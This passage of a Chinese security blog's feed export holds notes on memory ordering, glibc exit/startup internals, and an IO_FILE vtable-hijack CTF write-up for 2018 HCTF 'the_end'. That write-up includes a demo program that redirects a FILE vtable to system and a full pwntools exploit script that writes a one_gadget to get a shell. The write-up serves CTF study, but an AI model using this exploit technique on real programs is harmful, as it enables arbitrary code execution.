<span class="number">1</span> </span><br><span class="line">    <span class="number">274</span> <span class="number">1</span> <span class="number">0</span> </span><br><span class="line"><span class="meta">#head -n 取前n行 sort排序后 uniq命令用于检查及删除文本文件中重复出现的行列 -c统计该行重复出现的次数</span></span><br></pre></td></tr></table></figure><p>导致这方面的原因来自多核处理器的微架构  <a href="https://www.bilibili.com/video/BV1844y1z7Dx">https://www.bilibili.com/video/BV1844y1z7Dx</a></p><p>为了实现流水线，需要一条指令拆分为更小的可执行单元，叫做micro-operations简称uOps，利用寄存器重命名和分支目标预测的技术，实现超标量乱序执行。</p><p>在代码级上，看上去似乎是一次执行一条指令，但是实际上是指令级并行，呈现出一种简单的顺序执行指令的表象。正好能获得机器级程序要求的顺序语义模型的效果。</p><p>具体到我们上面的程序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">     # &lt;-----------+</span><br><span class="line">movl $<span class="number">1</span>, (x)   #   |</span><br><span class="line">movl (y), %eax # --+</span><br></pre></td></tr></table></figure><p>我们FLAG_XOR(3)后，在多处理器系统中，当一个CPU对共享内存进行修改时，需要使其他CPU中的缓存无效，导致<code>movl $1, %0;</code>几乎总是cache miss的，cpu在找内存同时执行下一条和上一条无关的指令，导致了输出0</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;movl $1, %0;&quot;</span> <span class="comment">// y = 1    </span></span><br><span class="line"><span class="string">&quot;movl %2, %1;&quot;</span> <span class="comment">// x_val = x</span></span><br><span class="line">: <span class="string">&quot;=m&quot;</span>(y), <span class="string">&quot;=r&quot;</span>(x_val) : <span class="string">&quot;m&quot;</span>(x)</span><br></pre></td></tr></table></figure><p><strong>实现一致性</strong></p><ul><li><p>Memory barrier:<a href="https://gcc.gnu.org/onlinedocs/gcc/_005f_005fsync-Builtins.html">__sync_synchronize()</a></p><blockquote><p><a href="https://zhuanlan.zhihu.com/p/41872203">好文</a></p><p>Built-in Function: <em>void</em> <strong>__sync_synchronize</strong> <em>(…)</em></p><p>This built-in function issues a full memory barrier.</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> __sync_synchronize (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* This issues the &quot;mfence&quot; instruction on x86/x86_64.  */</span></span><br><span class="line">  __asm__ __volatile__ (<span class="string">&quot;mfence&quot;</span> : : : <span class="string">&quot;memory&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们之前在解决顺序性，用到的asm volatile (“” ::: “memory”)引导编译器，而我们这次需要和硬件进行交流</p><p>防止这种CPU乱序，我们需要添加CPU memory fence。X86专门的memory fence指令是”mfence”；保证存访问操作完成后才能执行后续的内存访问操作</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;movl $1, %0;&quot;</span> <span class="comment">// x = 1</span></span><br><span class="line"><span class="string">&quot;mfence;&quot;</span></span><br><span class="line"><span class="string">&quot;movl %2, %1;&quot;</span> <span class="comment">// y_val = y</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/s/N/p3&gt; ./mem-ordering | head -n <span class="number">10000</span> |sort| uniq -c</span><br><span class="line">   <span class="number">1462</span> <span class="number">0</span> <span class="number">1</span> </span><br><span class="line">    <span class="number">221</span> <span class="number">1</span> <span class="number">0</span> </span><br><span class="line">   <span class="number">8317</span> <span class="number">1</span> <span class="number">1</span> </span><br></pre></td></tr></table></figure></blockquote></li><li><p>原子指令 </p><p>和我们的flag一样用原子变量</p><p><code>stdatomic.h</code></p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> NJUOS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vtable Hijack--2018 HCTF the_end</title>
      <link href="/2023/04/03/vtable-hijack/"/>
      <url>/2023/04/03/vtable-hijack/</url>
      
        <content type="html"><![CDATA[<p>通过之前的分析IO函数基本上都会取调用_IO_FILE_plus 的vtable里的函数指针，如果我们可以控制这个指针，就可以控制程序的执行流</p><h2 id="glibc2-23"><a href="#glibc2-23" class="headerlink" title="glibc2.23"></a>glibc2.23</h2><p>一种方法就是改vtable里的指针但是</p><p><img src="/2023/04/03/vtable-hijack/image-20230402114035931.png" alt="image-20230402114035931"></p><p>2.23libc里的_IO_file_jumps不可写的</p><p>那就只能伪造整个伪造_IO_FILE_plus 里的vtable为我们可写可控制的区域，比如我们alloc的堆</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> system_ptr 0x7ffff7a523a0;</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> *vtable_addr,*fake_vtable;</span><br><span class="line"></span><br><span class="line">    fp=fopen(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">    fake_vtable=<span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    vtable_addr=(<span class="type">long</span> <span class="type">long</span> *)((<span class="type">long</span> <span class="type">long</span>)fp+<span class="number">0xd8</span>); <span class="comment">//vtable offset</span></span><br><span class="line"></span><br><span class="line">    vtable_addr[<span class="number">0</span>]=(<span class="type">long</span> <span class="type">long</span>)fake_vtable;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(fp,<span class="string">&quot;sh&quot;</span>,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    fake_vtable[<span class="number">7</span>]=system_ptr; <span class="comment">//xsputn</span></span><br><span class="line"></span><br><span class="line">    fwrite(<span class="string">&quot;hi&quot;</span>,<span class="number">2</span>,<span class="number">1</span>,fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fwrite函数会调用vtable里**__xsputn<strong>指向的</strong>libio&#x2F;fileops.c里的_IO_new_file_xsputn**函数，传入的参数为文件流结构体_IO_FILE,数据目标地址，读取总字节数</p><p><img src="/2023/04/03/vtable-hijack/image-20230402114847219.png" alt="image-20230402114847219"></p><p><img src="/2023/04/03/vtable-hijack/image-20230402115216810.png" alt="image-20230402115216810"></p><h2 id="2018-HCTF-the-end"><a href="#2018-HCTF-the-end" class="headerlink" title="2018 HCTF the_end"></a>2018 HCTF the_end</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; checksec the_end </span><br><span class="line">[*] <span class="string">&#x27;/mnt/hgfs/Share/ctfwiki/pwn/io_file/the_end&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>程序有五个字节的任意地址写，泄露了libc的基地址</p><h3 id="hijack-IO-2-1-stdout-vtable-setbuf"><a href="#hijack-IO-2-1-stdout-vtable-setbuf" class="headerlink" title="hijack IO_2_1_stdout vtable _setbuf"></a>hijack <em>IO_2_1_stdout</em> vtable _setbuf</h3><p>程序最后调用了exit，前面对exit的sc解析调用 <code>exit</code> 后，会遍历 <code>_IO_list_all</code> ，挨个判断stderr stdout stdin</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">for</span> (fp = (_IO_FILE *) _IO_list_all; fp; fp = fp-&gt;_chain)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">if</span> (! (fp-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">  <span class="comment">/* Iff stream is un-orientated, it wasn&#x27;t used. */</span></span><br><span class="line">  &amp;&amp; fp-&gt;_mode != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br></pre></td></tr></table></figure><p>if条件成立会调用<code>vtable</code> 中 <code>_setbuf</code> 函数。_IO_UNBUFFERED为2</p><p><img src="/2023/04/03/vtable-hijack/image-20230403113124697.png" alt="image-20230403113124697"></p><p>只有stdout符合条件，所有我们劫持这个</p><p>两个字节修改stdout的vtable到一个伪造的vtable上，这个vtable的+0x58处必须是一个libc中的地址，因为我们只剩下三字节节的修改权力</p><p><img src="/2023/04/03/vtable-hijack/image-20230403121636295.png" alt="image-20230403121636295"></p><p>合适，所有选择0x7ffff7dd1968-0x58位置当作vtable距离stdin+0x30位置</p><p>再往vtable+0x58写入onegadget即可</p><p><img src="/2023/04/03/vtable-hijack/image-20230403125159852.png" alt="image-20230403125159852"></p><p>由于关闭了输出流，cat flag &gt; &amp;0或exec 1&gt;&amp;0重定向流</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"><span class="title function_">context</span><span class="params">(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span></span><br><span class="line">pwnfile=<span class="string">&#x27;./the_end&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;25172&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">ra = lambda: io.recvall()</span><br><span class="line">rl = lambda: io.recvline(keepends=True)</span><br><span class="line">ru = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = lambda: io.interactive()</span><br><span class="line">c = lambda: io.close()</span><br><span class="line">li = lambda x: <span class="built_in">log</span>.info(x)</span><br><span class="line">db = lambda x : gdb.attach(io,x)</span><br><span class="line">dbio= lambda : gdb.attach(io)</span><br><span class="line">uu32 = lambda x   : u32(x.ljust(<span class="number">4</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">uu64 = lambda x   : u64(x.ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">p =lambda x,y:print(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + hex(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">ru(b<span class="number">&#x27;</span>a gift <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">sleep_ad=int(ru(b&#x27;</span>,<span class="string">&#x27;),16)</span></span><br><span class="line"><span class="string">p(&#x27;</span>sleep<span class="number">&#x27;</span>,sleep_ad)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;sleep&#x27;</span>,sleep_ad)</span><br><span class="line">base=sleep_ad-libc.dump(<span class="string">&#x27;sleep&#x27;</span>)</span><br><span class="line">p(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">onegadget=base+<span class="number">0xf02b0</span></span><br><span class="line"><span class="built_in">stdin</span>=libc.dump(<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>)+base</span><br><span class="line"><span class="built_in">stdout</span>=libc.dump(<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>)+base</span><br><span class="line"><span class="meta"># gdb.attach(io)</span></span><br><span class="line"><span class="meta"># db(<span class="string">&#x27;b exit&#x27;</span>)</span></span><br><span class="line">ru(b<span class="number">&#x27;</span>\n<span class="number">&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">2</span>):</span><br><span class="line">    s(p64(<span class="built_in">stdout</span>+<span class="number">0xd8</span>+i))</span><br><span class="line">    s(p8(p64(<span class="built_in">stdin</span>+<span class="number">0x30</span>)[i]))</span><br><span class="line"><span class="meta"># dbio</span></span><br><span class="line"><span class="meta"># gdb.attach(io)</span></span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">3</span>):</span><br><span class="line">    s(p64(<span class="built_in">stdin</span>+<span class="number">0x30</span>+<span class="number">0x58</span>+i))</span><br><span class="line">    s(p8(p64(onegadget)[i]))</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> IO FILE </tag>
            
            <tag> Vtable Hijack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>After main return</title>
      <link href="/2023/04/02/main-return/"/>
      <url>/2023/04/02/main-return/</url>
      
        <content type="html"><![CDATA[<h1 id="main函数的return"><a href="#main函数的return" class="headerlink" title="main函数的return"></a>main函数的return</h1><p>我们平时写代码的时候可能并没有注意到缓冲区的问题，但是我们的printf还是输出了</p><p>举个简单例子</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;world&quot;</span>);</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行起来会发现第一个printf在执行完后并没有立刻输出，第二个printf也没有立即输出，而是在6s后一块输出，我们经过前面的IO FILE分析都知道IO是有缓冲区的，但是我们并没有刷新缓冲区输出到屏幕，return后做了什么操作吗，一切答案都在source code里</p><p>当我们运行一个动态链接的程序时，执行的第一条指令是动态链接器ld去做动态链接也就是ld-linux-x86-64.so加载libc，在Unix-like操作系统中，<code>_start</code>符号被作为程序入口点的默认值。</p><p>_start函数调用系统启动函数__libc_start_main, 该函数定义在 libc.so 中。它初始化执行环境，调用用户层的 main 函数，处理 main 函数的返回值，并且在需要的时候把控制返回给内核。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__libc_start_main (<span class="type">int</span> (*main) (<span class="type">int</span>, <span class="type">char</span> **, <span class="type">char</span> ** MAIN_AUXVEC_DECL),</span><br><span class="line">           <span class="type">int</span> argc, <span class="type">char</span> **argv,</span><br><span class="line">           __typeof (main) init,</span><br><span class="line">           <span class="type">void</span> (*fini) (<span class="type">void</span>),</span><br><span class="line">           <span class="type">void</span> (*rtld_fini) (<span class="type">void</span>), <span class="type">void</span> *stack_end)</span><br><span class="line">&#123;</span><br><span class="line">  init_cpu_features (&amp;_dl_x86_cpu_features);</span><br><span class="line">  <span class="keyword">return</span> generic_start_main (main, argc, argv, init, fini, rtld_fini,</span><br><span class="line">                 stack_end);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>generic_start_main里调用main最后会执行exit，做用户层和内核层的释放工作</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="comment">/* Nothing fancy, just call the function.  */</span></span><br><span class="line">  result = main (argc, argv, __environ MAIN_AUXVEC_PARAM);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span> (result);</span><br></pre></td></tr></table></figure><h2 id="start-hacking"><a href="#start-hacking" class="headerlink" title="_start hacking"></a>_start hacking</h2><h3 id="Compiler"><a href="#Compiler" class="headerlink" title="Compiler"></a>Compiler</h3><p>在Unix-like操作系统中，<code>_start</code>符号被作为程序入口点的默认值。</p><p>我们是不是可不可以不用这个默认值呢</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">my_main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This is a program without a main() function! printf&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gcc -nostartfiles -e my_main -g -o test test.c </code></p><ul><li>-nostartfiles:Do not use the standard system startup files when linking. The standard system libraries are used normally, unless -nostdlib, -nolibc, or -nodefaultlibs is used.</li><li>-e:Specify that the program entry point is entry. The argument is interpreted by the linker; the GNU linker accepts either a symbol name or an address.</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; gcc -nostartfiles -e my_main -g -o test test.c</span><br><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; ./test</span><br><span class="line">fish: “./test” terminated by signal <span class="title function_">SIGSEGV</span> <span class="params">(Address boundary error)</span></span><br></pre></td></tr></table></figure><p>直接终止了，没有输出</p><p>gdb看下，发现printf函数执行完了，ret时程序返回非法地址崩溃，没有输出是因为没有刷新缓冲区</p><p><img src="/2023/04/02/main-return/image-20230403005428232.png" alt="image-20230403005428232"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">my_main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This is a program without a main() function! printf&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; gcc -nostartfiles -e my_main -g -o test test.c</span><br><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; ./test</span><br><span class="line">This is a program without a <span class="title function_">main</span><span class="params">()</span> function! <span class="built_in">puts</span></span><br><span class="line">fish: “./test” terminated by signal <span class="title function_">SIGSEGV</span> <span class="params">(Address boundary error)</span></span><br></pre></td></tr></table></figure><p>改为puts，输出了，因为puts是行缓存属性，所有输出了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; objdump -d test</span><br><span class="line"></span><br><span class="line">test:     file format elf64-x86<span class="number">-64</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line"><span class="number">0000000000400320</span> &lt;<span class="built_in">puts</span>@plt<span class="number">-0x10</span>&gt;:</span><br><span class="line">  <span class="number">400320</span>:    ff <span class="number">35</span> e2 <span class="number">0</span>c <span class="number">20</span> <span class="number">00</span>    pushq  <span class="number">0x200ce2</span>(%rip)        # <span class="number">601008</span> &lt;_GLOBAL_OFFSET_TABLE_+<span class="number">0x8</span>&gt;</span><br><span class="line">  <span class="number">400326</span>:    ff <span class="number">25</span> e4 <span class="number">0</span>c <span class="number">20</span> <span class="number">00</span>    jmpq   *<span class="number">0x200ce4</span>(%rip)        # <span class="number">601010</span> &lt;_GLOBAL_OFFSET_TABLE_+<span class="number">0x10</span>&gt;</span><br><span class="line">  <span class="number">40032</span>c:    <span class="number">0f</span> <span class="number">1f</span> <span class="number">40</span> <span class="number">00</span>          nopl   <span class="number">0x0</span>(%rax)</span><br><span class="line"></span><br><span class="line"><span class="number">0000000000400330</span> &lt;<span class="built_in">puts</span>@plt&gt;:</span><br><span class="line">  <span class="number">400330</span>:    ff <span class="number">25</span> e2 <span class="number">0</span>c <span class="number">20</span> <span class="number">00</span>    jmpq   *<span class="number">0x200ce2</span>(%rip)        # <span class="number">601018</span> &lt;_GLOBAL_OFFSET_TABLE_+<span class="number">0x18</span>&gt;</span><br><span class="line">  <span class="number">400336</span>:    <span class="number">68</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       pushq  $<span class="number">0x0</span></span><br><span class="line">  <span class="number">40033b</span>:    e9 e0 ff ff ff       jmpq   <span class="number">400320</span> &lt;<span class="built_in">puts</span>@plt<span class="number">-0x10</span>&gt;</span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line"><span class="number">0000000000400340</span> &lt;my_main&gt;:</span><br><span class="line">  <span class="number">400340</span>:    <span class="number">55</span>                   push   %rbp</span><br><span class="line">  <span class="number">400341</span>:    <span class="number">48</span> <span class="number">89</span> e5             mov    %rsp,%rbp</span><br><span class="line">  <span class="number">400344</span>:    bf <span class="number">58</span> <span class="number">03</span> <span class="number">40</span> <span class="number">00</span>       mov    $<span class="number">0x400358</span>,%edi</span><br><span class="line">  <span class="number">400349</span>:    e8 e2 ff ff ff       callq  <span class="number">400330</span> &lt;<span class="built_in">puts</span>@plt&gt;</span><br><span class="line">  <span class="number">40034</span>e:    <span class="number">90</span>                   nop</span><br><span class="line">  <span class="number">40034f</span>:    <span class="number">5</span>d                   pop    %rbp</span><br><span class="line">  <span class="number">400350</span>:    c3                   retq   </span><br></pre></td></tr></table></figure><p>看下汇编也是retq不合法</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">my_main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This is a program without a main() function! printf&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如我们不用return返回，而是直接调用exit终止应该就可以正常刷新缓冲区，并退出</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; gcc -nostartfiles -e my_main -g -o test test.c</span><br><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; ./test</span><br><span class="line">This is a program without a <span class="title function_">main</span><span class="params">()</span> function! <span class="built_in">printf</span></span><br></pre></td></tr></table></figure><p>printf也被刷新缓冲区输出了，正常退出</p><p>我们也可以利用默认_start入口点去做</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> _start() &#123;</span><br><span class="line">  <span class="type">int</span> ret = my_main();</span><br><span class="line">  <span class="built_in">exit</span>(ret); </span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">my_main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This is a program without a main() function!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -nostartfiles -g -o test test.c</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; gcc -nostartfiles -g -o test test.c</span><br><span class="line">test.c: In function ‘_start’:</span><br><span class="line">test.c:<span class="number">4</span>:<span class="number">13</span>: warning: implicit declaration of function ‘my_main’ [-Wimplicit-function-declaration]</span><br><span class="line">   <span class="type">int</span> ret = my_main();</span><br><span class="line">             ^</span><br><span class="line">grxer@grxer /m/h/S/c/p/io_file&gt; ./test</span><br><span class="line">This is a program without a <span class="title function_">main</span><span class="params">()</span> function!</span><br></pre></td></tr></table></figure><h3 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h3><p>ELF Header里的 <code>Elf32_Addr      e_entry;            /* 程序入口地址 */</code>规定了程序的入口点，我们可以改掉这个入口点来做hacking</p>]]></content>
      
      
      
        <tags>
            
            <tag> Exit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Glibc exit() sc analysis</title>
      <link href="/2023/04/02/exit/"/>
      <url>/2023/04/02/exit/</url>
      
        <content type="html"><![CDATA[<h2 id="Glibc2-23-exit-source-code-analysis"><a href="#Glibc2-23-exit-source-code-analysis" class="headerlink" title="Glibc2.23 exit() source code analysis"></a>Glibc2.23 exit() source code analysis</h2><p>测试程序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;grxer&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="用户层面"><a href="#用户层面" class="headerlink" title="用户层面"></a>用户层面</h2><p>stdlib&#x2F;exit.c中</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">exit</span> <span class="params">(<span class="type">int</span> status)</span></span><br><span class="line">&#123;</span><br><span class="line">  __run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (<span class="built_in">exit</span>)</span><br></pre></td></tr></table></figure><p>__exit_funcs是什么?</p><p><img src="/2023/04/02/exit/image-20230402194009243.png" alt="image-20230402194009243"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">next</span>;</span><span class="comment">//单链表</span></span><br><span class="line">    <span class="type">size_t</span> idx;<span class="comment">//表示已经添加到该结构体中的函数数量。它用于跟踪 fns 数组中的下一个空闲位置。</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> <span class="title">fns</span>[32];</span><span class="comment">//析构函数结构体数组</span></span><br><span class="line">  &#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="comment">/* `flavour&#x27; should be of type of the `enum&#x27; above but since we need</span></span><br><span class="line"><span class="comment">       this element in an atomic operation we have to use `long int&#x27;.  */</span></span><br><span class="line">    <span class="type">long</span> <span class="type">int</span> flavor;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    flavor：用于标识退出处理函数的类型,在此结构体中定义了一个枚举类型，该字段应该是该枚举类型的成员之一</span></span><br><span class="line"><span class="comment">    &#123;ef_free, ef_us, ef_on, ef_at, ef_cxa&#125;</span></span><br><span class="line"><span class="comment">       - ef_free表示此位置空闲</span></span><br><span class="line"><span class="comment">       - ef_us表示此位置被使用中, 但是函数类型不知道</span></span><br><span class="line"><span class="comment">       - ef_on, ef_at, ef_cxa 分别对应三种不同的析构函数类型, 主要是参数上的差异</span></span><br><span class="line"><span class="comment">       at：一个指向无参数无返回值函数的指针，用于表示一种特殊的退出处理函数，该函数不需要传递任何参数，只需在程序退出时执行即可。</span></span><br><span class="line"><span class="comment">       on：一个带有两个参数的函数指针，第一个参数是退出状态码，第二个参数是一个指针类型，用于传递函数的参数。</span></span><br><span class="line"><span class="comment">       cxa：一个带有三个参数的函数指针，第一个参数是一个指针类型，用于传递函数的参数，第二个参数是退出状态码，第三个参数是一个指向动态共享对象句柄的指针。</span></span><br><span class="line"><span class="comment">    */</span>    </span><br><span class="line">    <span class="class"><span class="keyword">union</span>//<span class="title">union</span>类型，用于表示上面三种不同类型的析构函数</span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line">    <span class="type">void</span> (*at) (<span class="type">void</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line">        <span class="type">void</span> (*fn) (<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">        <span class="type">void</span> *arg;</span><br><span class="line">      &#125; on;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">      &#123;</span></span><br><span class="line">        <span class="type">void</span> (*fn) (<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line">        <span class="type">void</span> *arg;</span><br><span class="line">        <span class="type">void</span> *dso_handle;</span><br><span class="line">      &#125; cxa;</span><br><span class="line">      &#125; func;</span><br><span class="line">  &#125;;</span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> <span class="title">initial</span>;</span>           <span class="comment">//initial定义在libc的可写入段中</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *__<span class="title">exit_funcs</span> =</span> &amp;initial; <span class="comment">//exit函数链表</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="run-exit-handlers"><a href="#run-exit-handlers" class="headerlink" title="__run_exit_handlers"></a>__run_exit_handlers</h3><figure class="highlight c"><table><tr><td class="code"><pre><span 